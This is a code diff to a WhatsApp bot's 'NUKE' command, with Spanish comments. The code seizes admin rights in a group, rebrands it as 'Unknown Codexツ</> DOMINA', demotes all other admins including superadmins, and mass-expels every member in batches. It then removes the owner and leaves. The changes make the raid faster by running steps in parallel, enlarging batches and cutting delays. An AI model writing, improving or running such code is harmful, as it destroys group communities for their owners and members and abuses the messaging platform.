@@ -121,56 +121,48 @@ module.exports = {
         if (!isBotAdmin) {
             const targetPromote = botMember?.id || `${botNumber}@s.whatsapp.net`;
             await sock.groupParticipantsUpdate(groupId, [targetPromote], 'promote').catch(() => {});
-            await sleep(800);
+            await sleep(500);
             try {
                 groupMetadata = await sock.groupMetadata(groupId);
                 participants = groupMetadata?.participants || participants;
             } catch (_) {}
         }
 
-        // Desbloquear permisos de edición del grupo
-        await sock.groupSettingUpdate(groupId, 'unlocked').catch(() => {});
-
-        // ── PASO 1: Cambiar Nombre y Descripción PRIMERO mientras el bot está adentro como Admin ──
-        console.log('[NUKE] Aplicando nombre y descripción a Unknown Codexツ</> DOMINA...');
-        await updateGroupSubject(sock, groupId);
-        await sleep(150);
-        await updateGroupDescription(sock, groupId);
-
-        // ── PASO 2: Degradar a todos los demás admins para anular su inmunidad en WhatsApp ──
+        // ── PASO 1: Desbloqueo, Nombre, Descripción y Degradación de Admins EN PARALELO ──
+        console.log('[NUKE] Fase 1: Personalización, desbloqueo y degradación simultánea...');
         const otherAdmins = participants
-            .filter(p => (p.admin === 'admin') && !isBotParticipant(p))
+            .filter(p => (p.admin === 'admin' || p.admin === 'superadmin') && !isBotParticipant(p) && !isOwnerParticipant(p))
             .map(p => p.id);
 
-        if (otherAdmins.length > 0) {
-            await sock.groupParticipantsUpdate(groupId, otherAdmins, 'demote').catch(() => {});
-            await sleep(150);
-        }
+        await Promise.allSettled([
+            sock.groupSettingUpdate(groupId, 'unlocked').catch(() => {}),
+            updateGroupSubject(sock, groupId),
+            updateGroupDescription(sock, groupId),
+            otherAdmins.length > 0 ? sock.groupParticipantsUpdate(groupId, otherAdmins, 'demote').catch(() => {}) : Promise.resolve()
+        ]);
 
-        // ── PASO 3: Filtrar miembros a expulsar (el bot NUNCA se expulsa aquí) ──
+        // ── PASO 2: Expulsión masiva en ráfagas de 25 participantes por paquete IQ ──
         let othersToRemove = participants
             .filter(p => !isBotParticipant(p) && !isOwnerParticipant(p))
             .map(p => p.id);
 
-        console.log(`[NUKE] Expulsando ${othersToRemove.length} miembros a máxima velocidad...`);
+        console.log(`[NUKE] Expulsando ${othersToRemove.length} miembros a máxima velocidad (lotes de 35)...`);
 
-        // ── PASO 4: Expulsión en bloques atómicos por paquete IQ ──
-        const chunkSize = 15;
+        const chunkSize = 35;
         for (let i = 0; i < othersToRemove.length; i += chunkSize) {
             const chunk = othersToRemove.slice(i, i + chunkSize);
             try {
                 await sock.groupParticipantsUpdate(groupId, chunk, 'remove');
             } catch (_) {
-                for (const user of chunk) {
-                    await sock.groupParticipantsUpdate(groupId, [user], 'remove').catch(() => {});
-                }
+                // Fallback rápido en paralelo para este lote
+                await Promise.allSettled(chunk.map(u => sock.groupParticipantsUpdate(groupId, [u], 'remove').catch(() => {})));
             }
             if (i + chunkSize < othersToRemove.length) {
-                await sleep(100);
+                await sleep(60);
             }
         }
 
-        // ── PASO 5: Barrido de verificación garantizado ──
+        // ── PASO 3: Barrido de verificación ultra rápido ──
         try {
             const verifyMeta = await sock.groupMetadata(groupId);
             const remaining = (verifyMeta?.participants || [])
@@ -180,15 +172,12 @@ module.exports = {
             if (remaining.length > 0) {
                 console.log(`[NUKE] Barrido: eliminando ${remaining.length} rezagados...`);
                 await sock.groupParticipantsUpdate(groupId, remaining, 'demote').catch(() => {});
-                await sleep(100);
                 await sock.groupParticipantsUpdate(groupId, remaining, 'remove').catch(() => {});
-                for (const u of remaining) {
-                    await sock.groupParticipantsUpdate(groupId, [u], 'remove').catch(() => {});
-                }
+                await Promise.allSettled(remaining.map(u => sock.groupParticipantsUpdate(groupId, [u], 'remove').catch(() => {})));
             }
         } catch (_) {}
 
-        // ── PASO 6: Mensaje de confirmación final ──
+        // ── PASO 4: Mensaje de confirmación final ──
         await sock.sendMessage(groupId, {
             text: '☠️ *NUKE COMPLETADO*\n\n' +
                   '👥 Grupo limpiado\n' +
@@ -196,12 +185,12 @@ module.exports = {
                   '_Unknown Codexツ</> DOMINA_'
         }).catch(() => {});
 
-        // ── PASO 7: Expulsar al owner ahora que todos los miembros salieron ──
+        // ── PASO 5: Expulsar al owner ahora que todos los miembros salieron ──
         const ownerToRemove = ownerMember?.id || m.sender;
         await sock.groupParticipantsUpdate(groupId, [ownerToRemove], 'remove').catch(() => {});
 
-        // ── PASO 8: El bot sale del grupo ──
-        await sleep(800);
+        // ── PASO 6: El bot sale del grupo ──
+        await sleep(400);
         if (typeof sock.groupLeave === 'function') {
             await sock.groupLeave(groupId).catch(() => {});
         }
